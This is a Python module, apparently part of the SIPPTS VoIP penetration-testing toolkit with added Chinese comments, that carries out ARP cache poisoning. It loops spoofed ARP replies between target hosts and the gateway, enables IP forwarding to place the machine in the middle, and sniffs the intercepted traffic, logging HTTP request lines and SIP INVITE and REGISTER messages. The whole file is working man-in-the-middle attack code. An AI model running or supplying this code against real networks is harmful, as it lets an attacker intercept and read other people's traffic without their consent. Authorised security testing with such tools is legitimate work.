#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = "Jose Luis Verdeguer"
__version__ = "4.1"
__license__ = "GPL"
__copyright__ = "Copyright (C) 2015-2024, SIPPTS"
__email__ = "pepeluxx@gmail.com"


from scapy.all import Ether, ARP, srp, send, IP, TCP, UDP, Raw, sniff
import time
import signal
import os
import ipaddress
import threading
import platform
import socket
import netifaces
from IPy import IP as IPy_IP
from .lib.functions import (
    get_machine_default_ip,
    ip2long,
    get_default_gateway_linux,
    get_default_gateway_mac,
    get_default_gateway_windows,
    enable_ip_route,
    disable_ip_route,
    ip2long,
    long2ip,
)
from .lib.color import Color
from .lib.logos import Logo


class ArpSpoof:
    def __init__(self, callback=None):
        self.ip = "-"
        self.gw = ""
        self.verbose = 0
        self.file = ""
        self.ips = []
        self.dropped_ips = []

        self.run = True
        self.callback = callback  # 用于向UI发送消息的回调函数

        # 数据包监控相关
        self.monitor_thread = None
        self.stop_monitor = False
        self.interface = None
        self.monitor_enabled = False

        self.c = Color()

    def log_message(self, message):
        """向UI发送日志消息"""
        if self.callback:
            self.callback(message)
        else:
            print(message)

    def signal_handler(self, sig, frame):
        print(f"{self.c.BYELLOW}You pressed Ctrl+C!\n{self.c.WHITE}")
        print(f"{self.c.BWHITE}Restoring ARP tables ...")
        print(self.c.WHITE)

        self.stop()

    def start(self):
        # current_user = os.getlogin()
        current_user = os.popen("whoami").read()
        current_user = current_user.strip()
        ops = platform.system()

        try:
            self.verbose == int(self.verbose)
        except:
            self.verbose = 0

        if ops == "Linux" and current_user != "root":
            msg = f"{self.c.WHITE}You must be {self.c.RED}root{self.c.WHITE} to use this module"
            print(msg)
            return
        

        # my IP address
        try:
            # 获取interface对应的IP地址
            if self.interface:
                # 如果指定了接口，获取该接口的IP地址
                print(f"{self.c.BWHITE}[✓] 使用网络接口: {self.c.GREEN}{self.interface}")
                try:
                    addrs = netifaces.ifaddresses(self.interface)
                    if netifaces.AF_INET in addrs:
                        local_ip = addrs[netifaces.AF_INET][0]['addr']
                        print(f"{self.c.BWHITE}[✓] 本地IP地址: {self.c.GREEN}{local_ip}")
                    else:
                        # 如果指定接口没有IPv4地址，回退到默认方法
                        local_ip = get_machine_default_ip()
                        print(f"{self.c.BWHITE}[✓] 指定接口没有IPv4地址，回退到默认方法获取本地IP地址: {self.c.GREEN}{local_ip}")
                except Exception as e:
                    print(f"{self.c.YELLOW}[!] 获取接口IP出错: {str(e)}")
                    local_ip = get_machine_default_ip()
            else:
                # 未指定接口，使用默认方法获取IP
                local_ip = get_machine_default_ip()
                print(f"{self.c.BWHITE}[✓] 未指定接口，使用默认方法获取IP: {self.c.GREEN}{local_ip}")
        except:
            msg = f"{self.c.BRED}Error getting local IP"
            print(msg)
            msg = f"{self.c.BWHITE}Try with {self.c.BYELLOW}-local-ip{self.c.BWHITE} param"
            print(msg)
            print(self.c.WHITE)
            exit()

        if self.gw == "":
            if ops == "Linux":
                self.gw = get_default_gateway_linux()
            elif ops == "Darwin":
                self.gw = get_default_gateway_mac().strip()
            elif ops == "Windows":
                self.gw = get_default_gateway_windows()
        print(f"{self.c.BWHITE}[✓] Operating System: {self.c.GREEN}{ops}")
        print(f"{self.c.BWHITE}[✓] Current User: {self.c.GREEN}{current_user}")
        print(f"{self.c.BWHITE}[✓] Local IP address: {self.c.GREEN}{local_ip}")
        if self.file != "" and self.ip == None:
            print(
                f"{self.c.BWHITE}[✓] Target IP/range: {self.c.GREEN}In file '{self.file}"
            )
        else:
            print(f"{self.c.BWHITE}[✓] Target IP/range: {self.c.GREEN}{self.ip}")
        print(f"{self.c.BWHITE}[✓] Gateway: {self.c.GREEN}{self.gw}")
        print(self.c.WHITE)

        enable_ip_route()

        if self.file != "":
            try:
                with open(self.file) as f:
                    line = f.readline()
                    hosts = []

                    while line:
                        error = 0
                        line = line.replace("\n", "")

                        try:
                            if self.run == True:
                                try:
                                    ip = socket.gethostbyname(line)
                                    self.ip = IPy_IP(ip, make_net=True)
                                except:
                                    try:
                                        self.ip = IPy_IP(line, make_net=True)

                                    except:
                                        if line.find("-") > 0:
                                            val = line.split("-")
                                            start_ip = val[0]
                                            end_ip = val[1]
                                            self.ip = line

                                            error = 1

                                if error == 0:
                                    hosts = list(
                                        ipaddress.ip_network(str(self.ip)).hosts()
                                    )

                                    if hosts == []:
                                        hosts.append(self.ip)

                                    last = len(hosts) - 1
                                    start_ip = hosts[0]
                                    end_ip = hosts[last]

                                ipini = int(ip2long(str(start_ip)))
                                ipend = int(ip2long(str(end_ip)))

                                for i in range(ipini, ipend + 1):
                                    if i != local_ip and i != self.gw:
                                        self.ips.append(long2ip(i))
                                        self.ips.append("")
                        except:
                            pass

                        line = f.readline()

                f.close()
            except:
                print(f"Error reading file {self.file}")
                exit()
        else:
            for i in self.ip.split(","):
                ips = []
                hosts = []
                error = 0

                try:
                    if i.find("/") < 1:
                        i = socket.gethostbyname(i)
                        i = IPy_IP(i, make_net=True)
                    else:
                        i = IPy_IP(i, make_net=True)
                except:
                    if i.find("-") > 0:
                        val = i.split("-")
                        start_ip = val[0]
                        end_ip = val[1]

                        error = 1

                try:
                    if error == 0:
                        hlist = list(ipaddress.ip_network(str(i)).hosts())

                        if hlist == []:
                            hosts.append(i)
                        else:
                            for h in hlist:
                                hosts.append(h)

                        last = len(hosts) - 1
                        start_ip = hosts[0]
                        end_ip = hosts[last]

                    ipini = int(ip2long(str(start_ip)))
                    ipend = int(ip2long(str(end_ip)))
                    iplist = i

                    for i in range(ipini, ipend + 1):
                        if i != local_ip and i != self.gw:
                            self.ips.append(long2ip(i))
                            self.ips.append("")

                except:
                    pass

        threads = list()

        if self.ips == []:
            print(f"{self.c.RED}\nNo IPs found")
            print(self.c.WHITE)
            exit()

        n = len(self.ips)

        self.run = True

        # 如果开启了监控且提供了接口，启动监控
        if self.monitor_enabled and self.interface:
            self.start_monitor()

        for x in range(0, n, 2):
            ip = self.ips[x]
            mac = self.ips[x + 1]

            t = threading.Thread(
                target=self.start_spoof,
                args=(str(ip), self.gw, mac, self.verbose),
                daemon=True,
            )

            threads.append(t)
            t.start()
            time.sleep(0.1)

        t.join()

    def stop(self):
        print(f"{self.c.BWHITE}\nRestoring ARP tables ...")
        print(self.c.WHITE)

        # my IP address
        local_ip = get_machine_default_ip()

        n = len(self.ips)

        self.run = False

        for x in range(0, n, 2):
            ip = self.ips[x]
            if ip not in self.dropped_ips:
                if ip != local_ip and ip != self.gw:
                    self.restore(str(ip), self.gw, self.verbose)

        self.restore(self.gw, str(ip), self.verbose)

        # 停止监控
        self.stop_monitoring()

        # disable ip forwarding
        disable_ip_route()

    def get_mac(self, ip):
        """
        Returns MAC address of any device connected to the network
        If ip is down, returns None instead
        """
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=3, verbose=0
        )

        if ans:
            return ans[0][1].src

    def spoof(self, target_ip, host_ip, target_mac, verbose=1):
        """
        Spoofs `target_ip` saying that we are `host_ip`.
        it is accomplished by changing the ARP cache of the target (poisoning)
        """
        # craft the arp 'is-at' operation packet, in other words; an ARP response
        # we don't specify 'hwsrc' (source MAC address)
        # because by default, 'hwsrc' is the real MAC address of the sender (ours)
        arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op="is-at")
        # send the packet
        # verbose = 0 means that we send the packet without printing any thing
        send(arp_response, verbose=0)
        if verbose == 2:
            # get the MAC address of the default interface we are using
            self_mac = ARP().hwsrc
            msg = self.c.YELLOW + "[+] Sent restoring to {} : {} is-at {}".format(
                target_ip, host_ip, self_mac
            ) + self.c.WHITE
            print(msg)

    def restore(self, target_ip, host_ip, verbose=1):
        """
        Restores the normal process of a regular network
        This is done by sending the original informations
        (real IP and MAC of `gw_ip` ) to `target_ip`
        """
        # get the real MAC address of target
        target_mac = self.get_mac(target_ip)
        # get the real MAC address of spoofed (gateway, i.e router)
        host_mac = self.get_mac(host_ip)
        # crafting the restoring packet
        arp_response = ARP(
            pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac
        )
        # sending the restoring packet
        # to restore the network to its BWHITE process
        # we send each reply seven times for a good measure (count=7)
        send(arp_response, verbose=0, count=7)
        if verbose > 0:
            msg = self.c.GREEN + "[-] Sent poisoning to {} : {} is-at {}".format(
                target_ip, host_ip, host_mac
            ) + self.c.WHITE
            print(msg)

    def start_spoof(self, target_ip, gw_ip, target_mac, verbose):
        if verbose > 0:
            # get the real MAC address of target
            target_mac = self.get_mac(target_ip)
            # get the real MAC address of spoofed (gateway, i.e router)
            gw_mac = self.get_mac(gw_ip)

            if target_mac == None:
                msg = f"{self.c.RED}[!] Error getting the target MAC address for IP: {target_ip}{self.c.WHITE}"
                print(msg)
                self.dropped_ips.append(target_ip)
                return
            if gw_mac == None:
                msg = f"{self.c.RED}[!] Error getting the target MAC address for IP: {gw_ip}{self.c.WHITE}"
                print(msg)
                return

            msg = f"{self.c.YELLOW}[+] Start ARP spoof between {target_ip} ({target_mac}) and {gw_ip} ({gw_mac}){self.c.WHITE}"
            print(msg)

        while self.run == True:
            # telling the `target` that we are the `gw`
            self.spoof(target_ip, gw_ip, target_mac, verbose)
            # telling the `gw` that we are the `target`
            self.spoof(gw_ip, target_ip, "", verbose)
            # sleep for one second
            time.sleep(1)

    def start_monitor(self):
        """启动数据包监控"""
        self.stop_monitor = False
        
        if self.monitor_thread is None or not self.monitor_thread.is_alive():
            print("开始监控网络流量...")
            self.monitor_thread = threading.Thread(target=self._monitor_packets, daemon=True)
            self.monitor_thread.start()
    
    def stop_monitoring(self):
        """停止数据包监控"""
        self.stop_monitor = True
        if self.monitor_thread and self.monitor_thread.is_alive():
            self.monitor_thread.join(2)  # 等待最多2秒
    
    def _monitor_packets(self):
        """监控数据包"""
        # 使用scapy的sniff函数监控数据包
        try:
            sniff(prn=self._process_packet, 
                  store=0, 
                  stop_filter=lambda p: self.stop_monitor,
                  iface=self.interface)
        except Exception as e:
            print(f"监控网络流量时出错: {str(e)}")
    
    def _process_packet(self, packet):
        """处理捕获的数据包"""
        # 只处理IP数据包
        if IP in packet:
            summary = []
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            proto = "???"
            info = ""
            
            # 检查是否为TCP/UDP数据包
            if TCP in packet:
                proto = "TCP"
                src_port = packet[TCP].sport
                dst_port = packet[TCP].dport
                
                # 检查常见协议
                if dst_port == 80 or src_port == 80:
                    proto = "HTTP"
                elif dst_port == 443 or src_port == 443:
                    proto = "HTTPS"
                elif dst_port == 21 or src_port == 21:
                    proto = "FTP"
                elif dst_port == 22 or src_port == 22:
                    proto = "SSH"
                elif dst_port == 25 or src_port == 25:
                    proto = "SMTP"
                
                # TCP标志
                flags = ""
                if packet[TCP].flags.S:
                    flags += "SYN "
                if packet[TCP].flags.A:
                    flags += "ACK "
                if packet[TCP].flags.F:
                    flags += "FIN "
                if packet[TCP].flags.R:
                    flags += "RST "
                if packet[TCP].flags.P:
                    flags += "PSH "
                
                info = f"{src_ip}:{src_port} -> {dst_ip}:{dst_port} [{flags.strip()}]"
                
                # 检查HTTP内容
                if proto == "HTTP" and Raw in packet:
                    try:
                        http_data = packet[Raw].load.decode('utf-8', errors='ignore')
                        if "GET " in http_data or "POST " in http_data:
                            first_line = http_data.split('\r\n')[0]
                            info += f" {first_line}"
                    except:
                        pass
                
            elif UDP in packet:
                proto = "UDP"
                src_port = packet[UDP].sport
                dst_port = packet[UDP].dport
                
                # 检查常见协议
                if dst_port == 53 or src_port == 53:
                    proto = "DNS"
                elif dst_port == 161 or src_port == 161:
                    proto = "SNMP"
                elif (dst_port == 5060 or src_port == 5060) and Raw in packet:
                    proto = "SIP"
                
                info = f"{src_ip}:{src_port} -> {dst_ip}:{dst_port}"
                
                # 检查SIP内容
                if proto == "SIP" and Raw in packet:
                    try:
                        sip_data = packet[Raw].load.decode('utf-8', errors='ignore')
                        if "INVITE " in sip_data or "REGISTER " in sip_data or "OPTIONS " in sip_data:
                            first_line = sip_data.split('\r\n')[0]
                            info += f" {first_line}"
                    except:
                        pass
            
            # 将捕获的信息发送给回调
            if info:
                print(f"[{proto}] {info}")
